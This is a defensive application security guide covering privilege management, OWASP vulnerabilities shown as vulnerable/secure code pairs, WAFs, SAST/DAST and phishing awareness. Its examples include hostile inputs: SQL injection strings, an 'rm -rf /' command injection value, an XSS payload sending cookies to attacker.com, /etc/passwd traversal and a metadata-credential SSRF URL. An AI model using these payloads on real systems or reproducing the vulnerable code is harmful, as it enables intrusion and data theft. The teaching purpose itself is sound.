# Application Security: Concepts, Architecture & Best Practices

## Overview

This document provides a comprehensive guide to application security fundamentals for infrastructure engineers and developers. It covers the essential security concepts, vulnerabilities, defensive mechanisms, and secure development practices needed to build robust systems.

**Core Topics**:
- Privilege Access Management (PAM)
- OWASP Top 10 web vulnerabilities
- Web Application Firewalls (WAF)
- Secure Software Development Lifecycle (SAST/DAST)
- Social engineering and phishing awareness

---

## 1. What is Application Security?

**Definition**: Application security (AppSec) is the practice of designing, building, testing, and maintaining applications with security built in from the start.

### Why It Matters

- **Data Breach Costs**: Average cost of data breach: $4.24M USD (2021 IBM report)
- **Compliance**: GDPR, PCI-DSS, SOC 2, ISO 27001 require security controls
- **Business Impact**: Breaches damage reputation, cause downtime, expose customer data
- **Attack Surface**: Every line of code is a potential vulnerability

### Attack Chain Example

```
Attacker        Reconnaissance      Exploitation         Impact
   │                 │                   │                  │
   └─→ Scan site ─→ Find SQL injection ─→ Dump database ─→ Steal data
        (passive)      (OWASP #3)       (PoC)          (financial loss)
```

---

## 2. Privilege Access Management (PAM)

### What is PAM?

Privilege Access Management (PAM) is a security framework that controls, monitors, and limits access to critical systems and data. Core principle: **Least privilege** — users get minimum permissions needed for their role.

**Why PAM Matters**: Compromised privileged accounts can cause maximum damage (database deletion, credential theft, service disruption).

### PAM Concepts

| Concept | Definition | Example |
|---------|-----------|---------|
| **Privileged User** | Account with elevated permissions | DBA, DevOps engineer, root user |
| **Session Timeout** | Auto-logout after inactivity | 1 hour for cloud console |
| **MFA** | Multi-factor authentication | Google Authenticator + password |
| **Just-in-Time (JIT)** | Access granted temporarily on-demand | Approve 4-hour DB delete access |
| **Session Recording** | Audit trail of all actions | Track SSH commands executed |

### PAM Best Practices (Framework)

#### 1️⃣ Strong Authentication
```yaml
Requirements:
  - Multi-factor authentication (MFA) mandatory for all privileged accounts
  - Hardware security keys preferred (e.g., Yubikey)
  - Fallback: TOTP (Google Authenticator, Authy)
  - Password minimum 16 characters (or passphrase)

Example Policy:
  Privileged SSH Access:
    ├─ Factor 1: SSH key (ed25519, 4096-bit RSA minimum)
    ├─ Factor 2: MFA code (30-second window)
    └─ Session valid: 2 hours max
```

#### 2️⃣ Regular Access Review
```bash
# Quarterly privilege audit
kubectl get rolebindings -A                    # Kubernetes RBAC
gcloud iam service-accounts list                # GCP service accounts
aws iam list-users                              # AWS users and roles

# Remove unused accounts
kubectl delete rolebinding old-ci-account       # Clean up old CI/CD accounts
```

#### 3️⃣ Detailed Monitoring & Auditing
```yaml
Events to log (Immutable audit trail):
  - Privilege escalation (sudo, su, sudo -s)
  - Database administrative commands (DROP TABLE, ALTER USER)
  - Infrastructure changes (instance creation, network rules)
  - Authentication events (login, MFA challenges, failed attempts)

Storage:
  - Centralized logging (ELK, Splunk, Cloud Logging)
  - Immutable (cannot be deleted/modified retroactively)
  - Retention: minimum 1 year for sensitive operations
```

#### 4️⃣ Strong Password Policy
```yaml
Password Requirements (Minimum):
  - Length: 16+ characters (or passphrase)
  - Complexity: Mix of uppercase, lowercase, numbers, symbols
  - Rotation: Every 90 days for privileged accounts
  - History: No reuse of last 5 passwords
  - Lockout: 5 failed attempts → 15 min lockout

Example:
  ✅ Good:      "Blue-Elephant-42-Sunrise!" (passphrase)
  ❌ Bad:       "Admin123" (too simple, guessable)
```

#### 5️⃣ Session Timeout
```yaml
Session Duration:
  - Development: 8 hours
  - Production database: 1-2 hours
  - Financial systems: 15-30 minutes
  - Sensitive operations (account deletion): Require re-authentication

Example (kubectl):
  # Token valid for 1 hour, then must re-authenticate
  kubectl config set-credentials admin --token=<token>
  # After 1 hour: "error: You must be logged in"
```

#### 6️⃣ Dynamic & Context-Based Access (Just-in-Time)
```yaml
Traditional (Risky):
  User role: Database Operator
  → Permanently has: DROP TABLE permission
  → All 8 hours/day, every day → Can cause accidental damage

Just-in-Time (Safe):
  User: wants to DROP prod table
  → Submits: Access request with reason, duration
  → Manager: Approves for 2 hours only
  → Auto-revoked: After 2 hours, permission removed
  → Audit: All actions logged with context

Implementation Tools:
  - HashiCorp Vault (secrets + JIT access)
  - AWS SSO + temporary credentials
  - Teleport (SSH access with JIT)
```

### PAM Compliance Frameworks

| Framework | PAM Requirement | Our Implementation |
|-----------|-----------------|-------------------|
| **ISO 27001** | Access control policy, periodic review | ✅ Quarterly audit |
| **SOC 2** | Role-based access, change log | ✅ Cloud logging |
| **PCI-DSS** | MFA for admin, 90-day rotation | ✅ Enforced |
| **GDPR** | Data access logging, JIT | ⚠️ Partial |

---

## 3. OWASP Top 10: Common Web Vulnerabilities (2021)

![OWASP Top 10 2021](/runbooks/security/assets/owasp-top10.png)

### Overview

The OWASP Top 10 are the 10 most critical web application security risks. This section covers the 6 most common ones with code examples.

---

### Vulnerability #1: Injection (SQL, Command, NoSQL)

#### What is Injection?

**Definition**: Injecting untrusted data into an interpreter (SQL, shell, template) causes it to execute attacker's commands.

**Root Cause**: Concatenating user input directly into queries without sanitization.

#### SQL Injection (SQLi)

**Vulnerable Code**:
```python
# Python Flask - VULNERABLE
@app.route('/user/<user_id>')
def get_user(user_id):
    query = f"SELECT id, name, email FROM users WHERE id = {user_id}"
    result = db.execute(query)
    return result
```

**Attack**:
```
URL: /user/1 OR 1=1
→ Query becomes: SELECT id, name, email FROM users WHERE id = 1 OR 1=1
→ Returns: All users (not just one)

URL: /user/1; DROP TABLE users;--
→ Executes: DROP TABLE users
→ Result: Database table deleted
```

**Secure Code** (Parameterized Query):
```python
# SECURE - Uses parameterized query
@app.route('/user/<user_id>')
def get_user(user_id):
    query = "SELECT id, name, email FROM users WHERE id = ?"
    result = db.execute(query, [user_id])  # user_id treated as data, not code
    return result
```

**How It Works**:
- Database driver sanitizes `user_id` before inserting into query
- Cannot break out of string or inject SQL operators
- Trusted: always use parameterized queries

#### Command Injection

**Vulnerable Code**:
```python
# VULNERABLE - User input passed to shell
@app.route('/convert', methods=['POST'])
def convert_file():
    filename = request.form.get('filename')
    os.system(f"ffmpeg -i {filename} output.mp3")  # DANGER!
    return "Converted"
```

**Attack**:
```
Input: "video.mp4; rm -rf /"
→ Executes: ffmpeg -i video.mp4; rm -rf /
→ Result: Filesystem deleted
```

**Secure Code** (Use subprocess with list):
```python
# SECURE - Arguments passed as list, not string
import subprocess
@app.route('/convert', methods=['POST'])
def convert_file():
    filename = request.form.get('filename')
    subprocess.run(["ffmpeg", "-i", filename, "output.mp3"], check=True)
    return "Converted"
```

---

### Vulnerability #2: Cross-Site Scripting (XSS)

#### What is XSS?

**Definition**: Injecting JavaScript into a webpage so it runs in victim's browser.

**Risk**: Steal cookies/tokens, redirect to phishing, modify page content, keylogging.

#### Stored XSS (Persistent)

**Vulnerable Code**:
```python
# VULNERABLE - User comment rendered without escaping
@app.route('/posts/<post_id>')
def view_post(post_id):
    post = db.query(Post).filter(Post.id == post_id).first()
    return f"<h1>{post.title}</h1><p>{post.content}</p>"
```

**Attack**: Comment contains:
```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**Result**:
- Comment stored in database
- Every visitor's page renders JavaScript
- Attacker receives visitor's session cookie
- Attacker can impersonate victims

**Secure Code** (HTML Escape):
```python
# SECURE - Use framework's escape function
from flask import escape

@app.route('/posts/<post_id>')
def view_post(post_id):
    post = db.query(Post).filter(Post.id == post_id).first()
    return f"<h1>{escape(post.title)}</h1><p>{escape(post.content)}</p>"
```

**How Escaping Works**:
```
Original:  <script>alert('xss')</script>
Escaped:   &lt;script&gt;alert('xss')&lt;/script&gt;
Rendered:  <script>alert('xss')</script>  (text, not executable)
```

#### Reflected XSS (Non-Persistent)

**Vulnerable Code**:
```python
# VULNERABLE - URL parameter rendered directly
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<p>Search results for: {query}</p>"
```

**Attack URL**:
```
/search?q=<script>alert('xss')</script>
→ Page renders: <p>Search results for: <script>alert('xss')</script></p>
→ JavaScript executes in browser
```

**Secure Code**:
```python
# SECURE - Escape user input
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<p>Search results for: {escape(query)}</p>"
```

---

### Vulnerability #3: Server-Side Request Forgery (SSRF)

#### What is SSRF?

**Definition**: Making the server perform unauthorized requests to internal services or endpoints.

**Risk**: Access internal APIs, cloud metadata services, private databases.

#### Local File Inclusion (LFI)

**Vulnerable Code**:
```python
# VULNERABLE - User controls file path
@app.route('/download')
def download_file():
    path = request.args.get('path')
    filepath = os.path.join('/downloads', path)  # DANGER!
    return flask.send_file(filepath)
```

**Attack**:
```
URL: /download?path=../../../etc/passwd
→ filepath = /downloads/../../../etc/passwd = /etc/passwd
→ Server returns: root:x:0:0:...
```

**Secure Code** (Use safe path utilities):
```python
# SECURE - Use send_from_directory which validates paths
@app.route('/download')
def download_file():
    path = request.args.get('path')
    # Validates that path is within /downloads, rejects ../ etc.
    return flask.send_from_directory('/downloads', path)
```

#### Remote SSRF

**Vulnerable Code**:
```python
# VULNERABLE - User controls remote URL
@app.route('/proxy')
def proxy_request():
    url = request.args.get('url')
    response = requests.post(url, data={'action': 'deduct', 'amount': 100})
    return response.json()
```

**Attack**:
```
URL: /proxy?url=http://internal-payment-api:8080/admin/refund
→ Server connects to internal API (not accessible from internet)
→ Attacker can trigger internal operations

Or:
URL: /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Reads cloud metadata service (AWS/GCP/Azure)
→ Exposes: database passwords, API keys, credentials
```

**Secure Code** (Whitelist URLs):
```python
# SECURE - Use hardcoded config, don't accept user input
ALLOWED_PAYMENT_PROVIDER = "https://secure-payment.trusted-provider.com"

@app.route('/process-payment', methods=['POST'])
def process_payment():
    amount = request.form.get('amount')
    response = requests.post(ALLOWED_PAYMENT_PROVIDER, data={'amount': amount})
    return response.json()
```

---

### Vulnerability #4: Broken Authentication

#### What is Broken Authentication?

**Definition**: Weak credential management, session handling, or access control allows attackers to impersonate users.

**Examples**:
- Plaintext passwords in logs/code
- Guessable session tokens
- No MFA
- Session fixation
- Credential stuffing

#### Vulnerable Session Management

**Vulnerable Code**:
```python
# VULNERABLE - Predictable session token
import time
@app.before_request
def create_session():
    user_id = int(request.args.get('user_id'))
    session_token = str(time.time())  # Easy to predict!
    sessions[session_token] = user_id
    return session_token
```

**Attack**: Attacker can guess next token based on current one

**Secure Code** (Use cryptographic random):
```python
# SECURE - Cryptographically random token
import secrets

def create_session(user_id):
    session_token = secrets.token_urlsafe(32)  # 256-bit random
    sessions[session_token] = {'user_id': user_id, 'created': time.time()}
    return session_token
```

---

### Vulnerability #5: Broken Access Control (Authz)

#### What is Broken Access Control?

**Definition**: Users can access resources they shouldn't (horizontal/vertical privilege escalation).

**Examples**:
- User A views User B's profile by changing URL
- Regular user accesses admin panel
- User modifies own permissions

#### Horizontal Privilege Escalation

**Vulnerable Code**:
```python
# VULNERABLE - No check if user owns the resource
@app.route('/profile/<user_id>')
def view_profile(user_id):
    user = db.query(User).filter(User.id == user_id).first()
    return {'name': user.name, 'email': user.email, 'ssn': user.ssn}
```

**Attack**:
```
Current user: 123
URL: /profile/456
→ Returns User 456's data (including SSN!)
→ Attacker can enumerate all user profiles
```

**Secure Code** (Ownership check):
```python
# SECURE - Verify ownership before returning
from flask import session

@app.route('/profile/<user_id>')
def view_profile(user_id):
    current_user = get_current_user()  # From session
    
    if int(user_id) != current_user.id:
        return {'error': 'Unauthorized'}, 403  # Not allowed
    
    user = db.query(User).filter(User.id == user_id).first()
    return {'name': user.name, 'email': user.email}  # No SSN
```

#### Vertical Privilege Escalation

**Vulnerable Code**:
```python
# VULNERABLE - User can modify own role
@app.route('/profile', methods=['POST'])
def update_profile():
    user = get_current_user()
    user.role = request.form.get('role')  # User sets own role!
    db.commit()
    return {'success': True}
```

**Attack**:
```
POST /profile
role=admin

→ User becomes admin
→ Can now delete other users, modify data, etc.
```

**Secure Code** (Only allow safe fields):
```python
# SECURE - Only admin can change role, user can't
@app.route('/profile', methods=['POST'])
def update_profile():
    user = get_current_user()
    
    # Only update safe fields
    user.name = request.form.get('name')
    user.email = request.form.get('email')
    # role is NOT updated (admin-only operation)
    
    db.commit()
    return {'success': True}

# Separate admin endpoint for role changes
@app.route('/admin/user/<user_id>/role', methods=['POST'])
@require_admin
def update_user_role(user_id):
    if not is_admin(get_current_user()):
        return {'error': 'Forbidden'}, 403
    
    user = db.query(User).filter(User.id == user_id).first()
    user.role = request.form.get('role')
    db.commit()
    return {'success': True}
```

---

### Vulnerability #6: Sensitive Data Exposure

#### What is Sensitive Data Exposure?

**Definition**: Sensitive data (PII, credentials, payment info) exposed in transit or at rest.

**Examples**:
- HTTP instead of HTTPS
- Unencrypted database fields
- Credentials in code/logs
- Backup files readable by attackers

#### Vulnerable Code (Unencrypted Storage)

```python
# VULNERABLE - Password stored in plaintext
user = User(
    username='alice',
    password='MyPassword123'  # NEVER do this!
)
db.add(user)
db.commit()
```

**Secure Code** (Password Hashing):
```python
# SECURE - Use bcrypt (adaptive hash, gets slower over time)
from bcrypt import hashpw, checkpw, gensalt

hashed = hashpw(b'MyPassword123', gensalt(rounds=12))
# hashed = b'$2b$12$...(60 character hash)...'

user = User(
    username='alice',
    password_hash=hashed
)
db.add(user)
db.commit()

# On login, verify:
if checkpw(b'guess', user.password_hash):
    print("Password correct")
else:
    print("Wrong password")
```

#### Vulnerable: HTTP instead of HTTPS

```
❌ BAD: http://bank.com/login (credentials in plaintext on network)
✅ GOOD: https://bank.com/login (encrypted in transit)
```

---

## 4. Web Application Firewall (WAF) Architecture

![WAF Architecture](/runbooks/security/assets/waf-architecture.png)

### What is WAF?

**Definition**: An edge proxy that sits between internet and application server, detecting and blocking malicious HTTP requests.

**Purpose**: First line of defense against OWASP Top 10 and other web attacks.

### WAF Detection Methods

| Detection Type | Examples | Bypass Risk |
|---|---|---|
| **Rule-Based** | SQL keywords (OR, UNION), known SQLi patterns | Low (signature-based) |
| **Heuristic** | Unusual encoding, character count, entropy | Medium (behavioral) |
| **ML-Based** | Anomaly detection, traffic profiling | High (can be evaded with obfuscation) |

### WAF Request Flow

```
┌─────────────┐
│   Client    │ Sends request to api.example.com
└──────┬──────┘
       │ HTTPS request
       ▼
┌─────────────────────────────────────────────────────────────┐
│                    WAF (Edge Proxy)                         │
│  Imperva, Cloudflare, AWS WAF, Azure WAF                   │
│                                                             │
│  1. Parse HTTP request                                      │
│  2. Apply rules:                                            │
│     - SQL injection detection                              │
│     - XSS pattern detection                                │
│     - Rate limiting (100 req/sec per IP)                   │
│     - Bot detection                                        │
│  3. Decide: ALLOW / BLOCK / CHALLENGE                     │
│                                                             │
│  Decision Tree:                                            │
│    ├─ Match malicious pattern? → BLOCK (403)              │
│    ├─ Rate limit exceeded? → CHALLENGE (CAPTCHA)          │
│    ├─ Known bot? → BLOCK (403)                            │
│    └─ Clean request? → ALLOW                              │
└──────────────┬──────────────────────────────────────────────┘
       │ Filtered request
       ▼
┌─────────────────────────────────────┐
│    Load Balancer (Cloud Provider)   │
│    Azure LB / GCP LB / AWS ELB     │
└──────────────┬──────────────────────┘
       │ Route to appropriate backend
       ▼
┌─────────────────────────────────────┐
│    Application Server               │
│    (Protected from web attacks)     │
└─────────────────────────────────────┘
```

### WAF Protection Examples

#### Example 1: SQL Injection Block

```
Request URL:
/api/users?id=1' OR '1'='1

WAF Detection:
✓ Contains SQL keywords (OR)
✓ Matches SQLi pattern (single quotes + boolean logic)
✓ Action: BLOCK → 403 Forbidden
→ Never reaches application
```

#### Example 2: XSS Attack Block

```
Request:
POST /comment
Content: <script>alert('xss')</script>

WAF Detection:
✓ Contains <script> tag
✓ Matches XSS pattern (HTML + JavaScript)
✓ Action: BLOCK → 403 Forbidden
```

#### Example 3: Rate Limiting

```
Same IP sends 500 requests/sec (typical rate: 100/sec)

WAF Detection:
✓ Rate limit exceeded (500 > 100)
✓ Likely DDoS or bot attack
✓ Action: CHALLENGE → Send CAPTCHA or rate-limit
→ Legitimate traffic slowed temporarily
→ Bot/attacker traffic blocked
```

### WAF Configuration Best Practices

```yaml
WAF Rules Configuration:
  - Detection Mode: First 1 week (logs only, no blocking)
    Monitors: What rules would trigger
    Review: False positives (legitimate requests blocked)
  
  - Enforcement Mode: After false positive review
    Protection Level: Medium (balance security + usability)
    Exceptions: Whitelist trusted partners if needed
  
  - Sensitive Operations:
    - Admin panel: Stricter rules
    - Payment: Strict rate limiting
    - Login: Challenge on multiple failed attempts
  
  - Monitoring:
    - Track block rate (should be < 1% for legitimate traffic)
    - Alert if block rate spikes (possible attack or misconfiguration)
    - Review blocked requests weekly
```

---

## 5. Secure SDLC: SAST & DAST

![Secure SDLC Flow](/runbooks/security/assets/secure-sdlc.png)

### What is Secure SDLC?

**Definition**: Integrating security testing throughout the software development lifecycle instead of checking at the end.

**Benefits**:
- Catch vulnerabilities early (cost ↓ 10-100x)
- Prevent deployment of vulnerable code
- Educate developers on secure coding

### SAST: Static Application Security Testing

#### What is SAST?

**Definition**: Analyze source code without running it to find vulnerabilities.

**How It Works**:
```
Source Code → SAST Scanner → Parse AST → Apply Rules → Report Issues
```

**Advantages**:
- ✅ Early detection (before compilation)
- ✅ No test environment needed
- ✅ Fast feedback to developer
- ✅ Good for injection vulnerabilities

**Limitations**:
- ❌ High false positives
- ❌ Cannot detect runtime vulnerabilities
- ❌ Struggles with dynamic code

#### SAST Tools

| Tool | Language | Type | Free? |
|------|----------|------|-------|
| **Semgrep** | Python, JS, Java, Go | Pattern-based | ✅ |
| **SonarQube** | Java, C#, Python, JS | Heuristic | ✅ Free tier |
| **Snyk** | Python, JS, Java, Go | Dependency + code | ❌ |
| **Pylint** | Python | Style + basic checks | ✅ |
| **ESLint** | JavaScript | Style + security | ✅ |

#### SAST Example: Semgrep

```bash
# Install semgrep
brew install semgrep

# Scan Python code for vulnerabilities
semgrep --config=p/owasp-top-ten app.py

# Output example:
# ✗ SQL Injection in app.py:23
#   query = f"SELECT * FROM users WHERE id={user_id}"
#   → Use parameterized query instead
```

#### Enterprise SAST Implementation

```yaml
Enterprise SAST Pipeline:
  Tool: company/analyzer
  Integration: .gitlab-ci.yml
  Trigger: On every merge request
  
  Config:
    include:
      - project: 'company/analyzer'
        ref: v1
        file: 'shared/pipeline-template/.gitlab-sast-general.yaml'
  
  On Vulnerability Found:
    - Status: ❌ Pipeline FAILS
    - Developer: Fix or whitelist false positive
    - Review: Security team approves exceptions
    - Merge: Only after SAST passes
```

---

### DAST: Dynamic Application Security Testing

#### What is DAST?

**Definition**: Test running application (black box) by sending malicious requests and observing behavior.

**How It Works**:
```
Running App → Reconnaissance (discover APIs) → Fuzzing (send payloads) 
→ Analyze Response (500 = SQL error?) → Report Issues
```

**Advantages**:
- ✅ Tests actual running behavior
- ✅ Finds runtime vulnerabilities (race conditions, etc.)
- ✅ Detects vulnerabilities in dependencies
- ✅ Comprehensive (covers entire app)

**Limitations**:
- ❌ Slow (test all combinations)
- ❌ Late detection (only in test env)
- ❌ May crash or corrupt test data
- ❌ Cannot see source code

#### DAST Tools

| Tool | Type | Free? |
|------|------|-------|
| **OWASP ZAP** | API fuzzing + proxy | ✅ |
| **Burp Suite** | Web proxy + scanner | ❌ (Pro version) |
| **Acunetix** | Web vulnerability scanner | ❌ |
| **StackHawk** | DAST in CI/CD | ❌ |

#### DAST Example: OWASP ZAP

```bash
# Install ZAP
brew install zaproxy

# Scan running app
zaproxy -cmd -quickurl http://localhost:8080 -quickout report.html

# Output: HTML report with findings
# - SQL injection risks
# - Missing security headers
# - Insecure cookies
# - Vulnerable dependencies
```

### SAST vs DAST Comparison

| Aspect | SAST | DAST |
|--------|------|------|
| **When** | Development (before build) | Pre-release (test env) |
| **Speed** | Fast (seconds) | Slow (minutes/hours) |
| **Setup** | Easy (requires source) | Complex (needs running app) |
| **Coverage** | High (all code) | Partial (only reachable paths) |
| **False Positives** | High (30-50%) | Low (5-10%) |
| **Injection Detection** | ✅ Excellent | ✅ Good |
| **Race Conditions** | ❌ Can't detect | ✅ Can detect |
| **Real Behavior** | ❌ Misses runtime logic | ✅ Actual execution |

---

## 6. Secure Authentication & Authorization

![Authentication Flow](/runbooks/security/assets/auth-flow.png)

### Authentication vs Authorization

| Aspect | Authentication | Authorization |
|--------|---|---|
| **Definition** | "Are you who you claim?" | "Are you allowed to do this?" |
| **Example** | Login with password | Access /admin endpoint |
| **Failure** | Wrong password (401 Unauthorized) | Wrong permissions (403 Forbidden) |
| **Question** | "Is this Alice?" | "Can Alice view this document?" |

### Authentication Methods

#### 1️⃣ Password-Based (Least Secure)

```
Client                              Server
  │                                   │
  ├─ POST /login                      │
  │ username=alice&password=pass123   │
  ├──────────────────────────────────→│
  │                                   │ Hash password
  │                                   │ Compare to stored hash
  │                    Set session   │
  │ Set-Cookie: session=abc123def   │
  │←──────────────────────────────────┤
  │                                   │
  ├─ GET /account                     │
  │ Cookie: session=abc123def         │
  ├──────────────────────────────────→│
  │                                   │ Verify session
  │                                   │ Return user data
  │              { user data }        │
  │←──────────────────────────────────┤
```

**Vulnerabilities**:
- ❌ User reuses passwords across sites
- ❌ Passwords weak/guessable
- ❌ No MFA

**Mitigation**:
- ✅ Enforce strong passwords (16+ characters)
- ✅ Rate-limit login attempts (5 attempts → 15 min lockout)
- ✅ Require MFA (Google Authenticator, Yubikey)
- ✅ Use HTTPS (encrypt in transit)

#### 2️⃣ OAuth 2.0 (Third-Party Delegation)

```
User wants to login to YourApp using Google account:

1. User clicks "Login with Google"
2. YourApp redirects to Google:
   https://accounts.google.com/oauth/authorize
   ?client_id=123456
   &redirect_uri=yourapp.com/callback
   &scope=email,profile

3. User logs into Google (Google handles password)
4. Google asks: "Allow YourApp to access your email?"
5. User clicks "Allow"
6. Google redirects to YourApp:
   https://yourapp.com/callback
   ?code=auth_code_12345

7. YourApp backend exchanges code for token:
   POST https://accounts.google.com/token
   code=auth_code_12345
   client_id=123456
   client_secret=super_secret

8. Google returns: access_token=abc123def456

9. YourApp uses token to get user info:
   GET https://www.googleapis.com/oauth2/v2/userinfo
   Authorization: Bearer abc123def456
   → Returns: {email: alice@gmail.com, name: Alice}

10. YourApp creates session for Alice
11. Alice logged in ✅
```

**Advantages**:
- ✅ User never shares password with YourApp
- ✅ Google handles password security
- ✅ Easy multi-factor for user (Google manages it)

#### 3️⃣ JWT (JSON Web Tokens)

```
Token Format: Header.Payload.Signature

Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyX2lkIjoiMTIzNDU2Nzg5MCIsImV4cCI6MTYyNDAwMDAwMH0.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header (Base64 decoded):
{
  "alg": "HS256",    // Algorithm
  "typ": "JWT"       // Token type
}

Payload (Base64 decoded):
{
  "user_id": "123",
  "exp": 1624000000,       // Expires at 2021-06-18
  "iat": 1623996400       // Issued at 2021-06-18
}

Signature:
HMAC(header + payload + secret_key)
```

**Flow**:
```
1. Client logs in:
   POST /login
   {username, password}
   
2. Server verifies and creates JWT:
   JWT = sign({user_id, exp, role}, server_secret)
   Return: {token: JWT}

3. Client stores JWT in localStorage/sessionStorage

4. Client sends JWT with every request:
   GET /account
   Authorization: Bearer JWT

5. Server validates JWT:
   - Signature valid? (using server_secret)
   - Not expired? (check exp)
   - Return: User data
```

**Advantages**:
- ✅ Stateless (no server session storage needed)
- ✅ Scalable (can validate on any server)
- ✅ Portable (can use across microservices)

**Disadvantages**:
- ❌ Cannot revoke immediately (token valid until exp)
- ❌ Larger than session ID (sent with every request)
- ❌ Must keep secret_key secure

---

## 7. Social Engineering & Phishing Awareness

### What is Phishing?

**Definition**: Fraudulently obtaining sensitive information by pretending to be a trustworthy source.

**Real-World Impact**: Uber breach 2022 started with phishing email to engineer → stolen credentials → access to internal systems.

### Common Phishing Techniques

#### 1️⃣ Email Spoofing

**Attack**:
```
From: noreply@github.com  (actually: attacker@phishing.com)
To: engineer@company.com
Subject: Action Required: Verify Your Account

Your GitHub account requires verification.
Click here to confirm: https://github-verify.com/login

```

**Red Flags**:
- ❌ Urgency ("action required now")
- ❌ Requests to verify credentials
- ❌ Sender email slightly different (github.co vs github.com)
- ❌ Suspicious link (hover to see actual URL)

#### 2️⃣ Credential Theft via Fake Login

```
Fake site looks like: amazon.com
→ Actually: amaz0n.com (zero instead of o)
→ User enters password
→ Attacker captures credentials
→ Logs into real Amazon with stolen password
```

#### 3️⃣ Watering Hole Attack

```
Attacker compromises legitimate website visited by target
Users visit website → JavaScript injected → Malware downloaded
Example: Compromise developer.atlassian.com → Target engineers
```

### How to Identify Phishing

#### 🚩 Red Flags

| Warning Sign | Example |
|---|---|
| **Urgency** | "Verify immediately or account locked" |
| **Suspicious Sender** | noreply@gmail.com (not company domain) |
| **Generic Greeting** | "Dear User" instead of "Hi Alice" |
| **Request for Credentials** | "Confirm your password" |
| **Suspicious Links** | hover shows different URL |
| **Attachment Requests** | "Open attached document" (malware) |
| **Unusual Requests** | "Wire $50K to vendor" |
| **Poor Grammar** | Spelling errors, weird phrasing |

#### ✅ Verification Steps

```
1. Email claims to be from GitHub
   
   Step 1: Check sender email
   → Click sender name → See full email address
   → Is it @github.com? Or @phishing.com?
   
   Step 2: Check link destination
   → Hover over link (don't click!)
   → Does URL match sender? (link from GitHub → github.com)
   
   Step 3: Never use link provided
   → Go directly to site (type in address bar)
   → Or find official link elsewhere
   
   Step 4: Call if unsure
   → Phone number from official website (not email)
   → Ask: "Is this request legitimate?"
```

### Phishing Examples (Test Yourself)

#### Example 1: Apple Account Alert

```
From: noreply@apple.com
Subject: Your Apple ID requires immediate attention

Hello,

Your Apple account has been flagged for suspicious activity.
Please verify your identity:
[CLICK HERE TO VERIFY]

Questions?
Apple Support Team
```

**Is This Phishing?**
- 🚩 Urgency ("immediate attention")
- 🚩 Request to verify credentials
- 🚩 Vague subject (no specific action)
- ✅ But: Could be legitimate Apple security alert

**How to Verify**:
1. Hover over "CLICK HERE" → See actual URL
2. If URL is not apple.com → ❌ Phishing
3. If URL is apple.com → ✅ Likely legitimate
4. When in doubt, go to apple.com directly

#### Example 2: GitHub Merge Request Review

```
From: dev-team@github-updates.co
Subject: Review needed: PR#12345

Hi,

A code review is waiting for you:
https://github-pr-review.io/pr/12345

Please login to continue.

- GitHub Bot
```

**Red Flags**:
- ❌ Sender: github-updates.co (not github.com)
- ❌ Link: github-pr-review.io (not github.com)
- ❌ Request to login (suspicious pattern)
- ❌ Generic "Hi" (no name)

**Verdict**: ❌ **100% Phishing** → Delete

---

## 8. Defensive Layers (Defense in Depth)

### Architecture Diagram

```
┌─────────────────────────────────────────────────────┐
│ Layer 1: Edge Security                              │
│ ├─ WAF (Imperva) - Blocks SQL injection, XSS, bots │
│ ├─ DDoS Protection                                  │
│ └─ Rate Limiting                                    │
├─────────────────────────────────────────────────────┤
│ Layer 2: Authentication                             │
│ ├─ MFA (Google Authenticator)                       │
│ ├─ OAuth 2.0 (third-party login)                    │
│ └─ JWT tokens (stateless sessions)                  │
├─────────────────────────────────────────────────────┤
│ Layer 3: Authorization                              │
│ ├─ RBAC (Role-Based Access Control)                │
│ ├─ Ownership checks (user can only see own data)    │
│ └─ Fine-grained permissions                         │
├─────────────────────────────────────────────────────┤
│ Layer 4: Application Security                       │
│ ├─ Input validation & sanitization                  │
│ ├─ Parameterized queries (prevent SQLi)             │
│ ├─ Output encoding (prevent XSS)                    │
│ └─ HTTPS (encrypt in transit)                       │
├─────────────────────────────────────────────────────┤
│ Layer 5: Data Protection                            │
│ ├─ Encryption at rest (database)                    │
│ ├─ Encryption in transit (TLS)                      │
│ ├─ Field-level encryption (PII)                     │
│ └─ Backup encryption                                │
├─────────────────────────────────────────────────────┤
│ Layer 6: Monitoring & Response                      │
│ ├─ WAF log analysis                                 │
│ ├─ Database audit logs                              │
│ ├─ SIEM (Security Information & Event Management)  │
│ └─ Alerting on suspicious activity                  │
└─────────────────────────────────────────────────────┘
```

---

## 9. Security Checklist

### Pre-Deployment Security Review

- [ ] **Authentication**
  - [ ] MFA enabled for all admin accounts
  - [ ] Passwords hashed with bcrypt (cost=12+)
  - [ ] JWT expires within 1 hour
  - [ ] Session timeout configured

- [ ] **Authorization**
  - [ ] Ownership checks on all user resources
  - [ ] Admin endpoints require role validation
  - [ ] Users cannot modify their own permissions
  - [ ] Default deny (whitelist approach)

- [ ] **Input Validation**
  - [ ] All user inputs validated (type, length, format)
  - [ ] Parameterized queries used (no string concat)
  - [ ] File uploads validated (type, size, scan)
  - [ ] SSRF prevented (whitelist URLs)

- [ ] **Output Encoding**
  - [ ] HTML output escaped (prevent XSS)
  - [ ] JSON responses use proper encoding
  - [ ] Error messages don't leak sensitive info

- [ ] **HTTPS & Encryption**
  - [ ] HTTPS enforced (HTTP redirects to HTTPS)
  - [ ] TLS 1.2+ required
  - [ ] Database encryption at rest
  - [ ] Secrets not in code/logs

- [ ] **Monitoring**
  - [ ] WAF enabled and monitoring
  - [ ] Authentication logs captured
  - [ ] Failed login attempts tracked
  - [ ] Alerting on anomalies

---

## 10. Key Takeaways

1. **Security is layered** — No single solution; use defense in depth
2. **Validate everything** — Never trust user input
3. **Encrypt sensitive data** — In transit (HTTPS) and at rest
4. **Monitor continuously** — Logs are your detective work
5. **Assume breach** — Plan for "when", not "if"
6. **User education** — Phishing awareness saves more breaches than technology
7. **Fail securely** — Errors should deny access, not grant it
8. **Keep it simple** — Complex security is hard to maintain

---

## Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [Secure Coding Guidelines](https://www.securecoding.cert.org/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

**Last Updated**: January 2026
